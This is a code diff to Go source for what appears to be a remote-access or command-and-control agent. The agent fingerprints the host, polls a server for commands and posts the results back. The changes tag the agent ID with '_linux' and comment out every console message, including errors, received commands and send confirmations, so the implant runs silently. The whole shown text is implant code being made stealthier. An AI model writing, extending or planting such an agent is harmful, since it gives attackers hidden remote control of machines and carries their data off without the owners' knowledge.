@@ -74,7 +74,7 @@ func generate10DigitCode(input string) string {
 	mod := new(big.Int).Exp(big.NewInt(10), big.NewInt(10), nil)
 	i.Mod(i, mod)
 
-	return fmt.Sprintf("%010d", i)
+	return fmt.Sprintf("%010d_linux", i)
 }
 
 
@@ -108,18 +108,18 @@ func sendOutput(agentID string, output string) {
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		fmt.Printf("[-] Error marshalling payload: %v\n", err)
+		// fmt.Printf("[-] Error marshalling payload: %v\n", err)
 		return
 	}
 
 	resp, err := httpClient.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
-		fmt.Printf("[-] Error sending output: %v\n", err)
+		// fmt.Printf("[-] Error sending output: %v\n", err)
 		return
 	}
 	defer resp.Body.Close()
 
-	fmt.Println("[+] Output sent back to server successfully.")
+	// fmt.Println("[+] Output sent back to server successfully.")
 }
 
 
@@ -128,8 +128,8 @@ func main() {
 	sysIdentifier := getSystemIdentifier()
 	AgentID = generate10DigitCode(sysIdentifier)
 
-	fmt.Printf("[*] Starting agent %s...\n", AgentID)
-	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)
+	// fmt.Printf("[*] Starting agent %s...\n", AgentID)
+	// fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)
 
 	currentInterval := 5
     currentJitter := 0
@@ -139,7 +139,7 @@ func main() {
 		pollURL := fmt.Sprintf("%s/api/agent/poll?id=%s", ServerURL, AgentID)
 		resp, err := httpClient.Get(pollURL)
 		if err != nil {
-			fmt.Printf("[-] Error connecting to server: %v\n", err)
+			// fmt.Printf("[-] Error connecting to server: %v\n", err)
 			time.Sleep(PollDelay)
 			continue
 		}
@@ -147,7 +147,7 @@ func main() {
 		body, err := io.ReadAll(resp.Body)
 		resp.Body.Close()
 		if err != nil {
-			fmt.Printf("[-] Error reading response: %v\n", err)
+			// fmt.Printf("[-] Error reading response: %v\n", err)
 			time.Sleep(PollDelay)
 			continue
 		}
@@ -155,7 +155,7 @@ func main() {
 		var pollResp PollResponse
 
 		if err := json.Unmarshal(body, &pollResp); err != nil {
-			fmt.Printf("[-] Error parsing JSON: %v\n", err)
+			// fmt.Printf("[-] Error parsing JSON: %v\n", err)
 			time.Sleep(PollDelay)
 			continue
 		}
@@ -169,7 +169,7 @@ func main() {
 
 
 		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
-			fmt.Printf("[+] Received command: %s\n", pollResp.Command)
+			// fmt.Printf("[+] Received command: %s\n", pollResp.Command)
 
 
 			var outputStr string
